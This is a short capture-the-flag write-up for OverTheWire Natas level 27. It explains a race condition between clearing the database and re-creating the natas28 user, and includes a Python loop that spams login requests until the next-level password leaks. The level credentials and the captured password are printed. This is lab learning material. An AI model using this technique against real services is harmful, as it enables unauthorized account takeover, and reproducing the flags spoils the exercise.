# [natas 27](http://natas27.natas.labs.overthewire.org)

    Username: natas27
    Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

I failed injecting a SQL on this level.
The trick to beating this level is in the comments at the top of the page.

    // database gets cleared every 5 min

We can do this by spamming login attempts to the server and if we post at the exact moment where the database gets cleared but the natas28 user is not automatically added yet, we can create our own natas28 user.
It seems the database clearing and creation of the natas28 user is not in one transaction but has some delay between them.
I will show a python script doing this.

    import requests
    while True:
        r = requests.get('http://natas27.natas.labs.overthewire.org/?username=natas28&password=', auth=('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'))
        if 'Here' in r.text:
            print(r.text)
            break

Some minutes later, I get the password.

    JWwR438wkgTsNKBbcJoowyysdM82YjeF

